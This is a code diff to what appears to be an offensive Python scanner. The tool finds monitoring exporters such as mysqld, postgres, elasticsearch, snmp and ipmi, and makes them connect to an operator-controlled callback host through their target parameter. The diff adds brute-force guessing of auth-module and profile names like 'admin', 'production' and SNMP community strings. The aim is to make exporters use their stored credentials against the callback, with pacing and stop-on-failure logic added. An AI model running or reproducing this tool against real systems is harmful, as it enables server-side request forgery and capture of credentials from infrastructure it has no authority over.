@@ -17,6 +17,88 @@ from .output import extract_display_port
 
 HttpGetText = Callable[[str, float, int], tuple[int, str]]
 
+# These are bounded guesses for named profiles, not an enumeration of an
+# exporter's private configuration. A configured custom name remains available
+# through --profiles-file (and --postgres-auth-module for Postgres).
+_COMMON_PROFILE_NAMES = (
+    "default",
+    "monitoring",
+    "metrics",
+    "prometheus",
+    "exporter",
+    "readonly",
+    "read_only",
+    "read-only",
+    "ro",
+    "prod",
+    "production",
+    "stage",
+    "staging",
+    "test",
+    "testing",
+    "dev",
+    "development",
+    "local",
+    "main",
+    "primary",
+    "cluster",
+    "admin",
+)
+_KNOWN_TRIGGER_PROFILES: dict[str, tuple[str, tuple[str, ...]]] = {
+    "mysqld_exporter": (
+        "auth_module",
+        ("client", "client.servers", "client.mysql", "client.local") + _COMMON_PROFILE_NAMES,
+    ),
+    "elasticsearch_exporter": (
+        "auth_module",
+        ("basic", "apikey", "api_key", "bearer", "userpass", "elasticsearch", "opensearch") + _COMMON_PROFILE_NAMES,
+    ),
+    "postgres_exporter": ("auth_module", ("userpass", "postgresql", "postgres", "pgbouncer") + _COMMON_PROFILE_NAMES),
+    "snmp_exporter": (
+        "auth",
+        (
+            "public_v2",
+            "public_v1",
+            "private_v2",
+            "readonly_v2c",
+            "read_only_v2c",
+            "network_v3_authpriv",
+            "public",
+            "private",
+        )
+        + _COMMON_PROFILE_NAMES,
+    ),
+    "json_exporter": ("module", ("json", "http", "basic", "bearer", "apikey") + _COMMON_PROFILE_NAMES),
+    "ipmi_exporter": ("module", ("ipmi", "bmc", "lan") + _COMMON_PROFILE_NAMES),
+    "blackbox_exporter": (
+        "module",
+        ("http_2xx", "http_post_2xx", "tcp_connect", "http_basic", "http_auth", "http_bearer") + _COMMON_PROFILE_NAMES,
+    ),
+    "proxmox_exporter": ("module", ("pve", "proxmox", "api") + _COMMON_PROFILE_NAMES),
+}
+
+
+def trigger_query_variants(exporter: dict[str, Any]) -> list[str]:
+    """Return the configured query followed by bounded, deduplicated profile probes."""
+
+    base_query = str(exporter.get("trigger_query") or "").strip().lstrip("?")
+    profile_spec = _KNOWN_TRIGGER_PROFILES.get(str(exporter.get("name") or ""))
+    if profile_spec is None:
+        return [base_query]
+    parameter, names = profile_spec
+    pairs = urllib.parse.parse_qsl(base_query, keep_blank_values=True)
+    selected = [value for key, value in pairs if key == parameter]
+    # An explicitly configured, nonstandard name is intentional. Do not
+    # replace it with guesses or multiply an explicit Postgres module list.
+    if selected and selected[-1] != "default":
+        return [base_query]
+    variants = [base_query]
+    for name in names:
+        query = urllib.parse.urlencode([(key, value) for key, value in pairs if key != parameter] + [(parameter, name)])
+        if query not in variants:
+            variants.append(query)
+    return variants
+
 
 def detect_trigger_exporter_task(
     logger: AttemptLogger | None,
@@ -93,6 +175,8 @@ def trigger_detected_exporter_task(
     http_get_text_fn: HttpGetText,
     emit_trigger_event: Callable[[dict[str, Any]], None] | None = None,
     scheme: str = "http",
+    profile_delay: float = 0.0,
+    sleep_fn: Callable[[float], None] = time.sleep,
 ) -> dict[str, Any]:
     exporter_name = str(exporter["name"])
     port = int(exporter["port"])
@@ -111,13 +195,27 @@ def trigger_detected_exporter_task(
         },
     }
 
-    for callback_target in callback_targets:
+    attempts = [
+        (callback_target, variant_index, query)
+        for callback_target in callback_targets
+        for variant_index, query in enumerate(trigger_query_variants(exporter))
+    ]
+    consecutive_exporter_failures = 0
+    for attempt_index, (callback_target, variant_index, extra_query) in enumerate(attempts):
+        if attempt_index and profile_delay > 0:
+            sleep_fn(profile_delay)
         target = str(exporter["target_fmt"]).format(our_host=format_http_host(callback_target))
         callback_port = extract_display_port(target)
         query_parts = [f"target={urllib.parse.quote(target, safe=':/')}"]
-        extra_query = str(exporter.get("trigger_query") or "").strip()
         if extra_query:
             query_parts.append(extra_query.lstrip("?"))
+        profile_event: dict[str, str] = {}
+        profile_spec = _KNOWN_TRIGGER_PROFILES.get(exporter_name)
+        if profile_spec is not None:
+            parameter = profile_spec[0]
+            selected_profile = urllib.parse.parse_qs(extra_query).get(parameter)
+            if selected_profile:
+                profile_event = {"profile_parameter": parameter, "profile_name": selected_profile[-1]}
         trigger_url = build_http_url(
             host,
             port,
@@ -136,13 +234,15 @@ def trigger_detected_exporter_task(
                     "callback_port": callback_port,
                     "target": target,
                     "trigger_url": trigger_url,
+                    **profile_event,
                 }
             )
 
         result["attempted"] += 1
         result["by_callback"][callback_target]["attempted"] += 1
         try:
-            trigger_status, trigger_body = http_get_text_fn(trigger_url, timeout, retries)
+            trigger_status, trigger_body = http_get_text_fn(trigger_url, timeout, retries if variant_index == 0 else 0)
+            consecutive_exporter_failures = consecutive_exporter_failures + 1 if trigger_status >= 500 else 0
             probe_success: bool | None = None
             for raw_line in trigger_body.splitlines():
                 line = raw_line.strip()
@@ -181,6 +281,7 @@ def trigger_detected_exporter_task(
                             "accepted": request_accepted,
                             "confirmed": True,
                             "success": True,
+                            **profile_event,
                         }
                     )
                 result["success"] += 1
@@ -221,6 +322,7 @@ def trigger_detected_exporter_task(
                             "accepted": request_accepted,
                             "confirmed": False,
                             "success": False,
+                            **profile_event,
                             **({"error": error_text} if error_text is not None else {}),
                         }
                     )
@@ -241,7 +343,11 @@ def trigger_detected_exporter_task(
                         error=error_text,
                         probe_success=probe_success,
                     )
+            if consecutive_exporter_failures >= 3:
+                result["profile_sweep_stopped"] = "exporter_unavailable"
+                break
         except (urllib.error.URLError, OSError, TimeoutError) as exc:
+            consecutive_exporter_failures += 1
             if emit_trigger_event is not None:
                 emit_trigger_event(
                     {
@@ -255,6 +361,7 @@ def trigger_detected_exporter_task(
                         "trigger_url": trigger_url,
                         "success": False,
                         "error": str(exc),
+                        **profile_event,
                     }
                 )
             result["by_callback"][callback_target]["fail"] += 1
@@ -268,6 +375,9 @@ def trigger_detected_exporter_task(
                     trigger_url=trigger_url,
                     error=str(exc),
                 )
+            if consecutive_exporter_failures >= 3:
+                result["profile_sweep_stopped"] = "exporter_unavailable"
+                break
 
     return result
 
@@ -288,6 +398,7 @@ def scan_exporters_and_trigger(
     http_get_text_fn: HttpGetText | None = None,
     scheme: str = "http",
     tls_context: ssl.SSLContext | None = None,
+    profile_delay: float = 0.0,
 ) -> dict[str, Any]:
     if http_get_text_fn is None:
         from .http_client import http_get_text
@@ -372,7 +483,7 @@ def scan_exporters_and_trigger(
                     by_exporter[exporter_name]["detected"] += 1
                 detected_pairs.append((host, exporter))
                 if callback_list and progress_add_total is not None:
-                    progress_add_total(len(callback_list))
+                    progress_add_total(len(callback_list) * len(trigger_query_variants(exporter)))
         finally:
             if progress_advance is not None:
                 progress_advance(1)
@@ -429,6 +540,7 @@ def scan_exporters_and_trigger(
             http_get_text_fn,
             emit_trigger_event,
             scheme,
+            profile_delay,
         )
 
     for _job, result in deep_scheduler.iter_completed(detected_pairs, _deep_job):
